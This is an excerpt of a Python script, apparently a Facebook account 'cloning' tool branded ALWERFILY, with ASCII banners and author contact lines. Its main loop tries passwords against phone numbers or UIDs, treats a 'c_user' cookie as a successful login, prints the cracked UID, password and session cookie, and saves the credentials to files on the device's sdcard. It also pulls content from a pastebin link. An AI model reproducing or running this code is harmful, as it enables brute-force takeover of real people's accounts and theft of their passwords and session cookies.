...
os.system('am start https://www.facebook.com/mei.wong.39142&mibextid=ZbWKwL')
...
try:
    ...
    os.system("xdg-openhttps://www.facebook.com/mei.wong.39142&mibextid=ZbWKwL")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/MhL6RFnE").text
...
╚███╔███╔╝███████╗██║  ██║██║     ██║███████╗██║   
 ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝   
  ...
  AUTHOR   :   ALWERFILY
  FACEBOOK :   ALWERFILY
  LIFE STATUS  :   ALWERFILY
  FB GROUP  : ALWERFILY 0002
  TELEGRAM : Xilx07                        
\033[1;91m=========================================================="""
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  A L W E R F I L Y   \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41mA L W E R F I L Y   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mALWERFILY:👇\033[0;m]")
    print(f"")
    ...
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  A L W E R F I L Y   \033[0;m]")
    print(f"")
    limit = int(input(' ALWERFILY: 1000, 2000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[ALWERFILY-OK😁]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/ALWERFILY-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[ALWERFILY-CP😭]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/ALWERFILY-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/ALWERFILY-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ALWERFILY ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
